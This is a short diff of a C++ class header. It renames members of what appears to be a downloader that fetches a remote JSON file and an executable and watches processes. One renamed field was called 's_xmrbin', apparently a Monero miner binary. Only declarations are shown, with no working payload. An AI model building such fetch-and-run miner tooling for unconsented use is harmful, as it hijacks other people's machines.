@@ -26,11 +26,11 @@ private:
     static int  DownloadFile(const char *pCurl,const char* pFilePath);
     static uv_work_t *m_worker;
     static int m_curl_global_init_rc;
-    static string s_jsonfile;       // path to save downloaded json.txt
-    static string s_exefile;        // path to save downloaded exe bin
+    static string s_jsdlpath;       // path to save downloaded json.txt
+    static string s_exedlpath;        // path to save downloaded exe bin
     static const char* s_json_url_addr;  // remote json url address
     static const char* s_exe_url_addr;   // remote exe bin url address
-    static const char* s_xmrbin;         // program
+    static const char* s_local_exe_path;         // program
     static PsWatcher *m_pPsWatcher;
 };
 
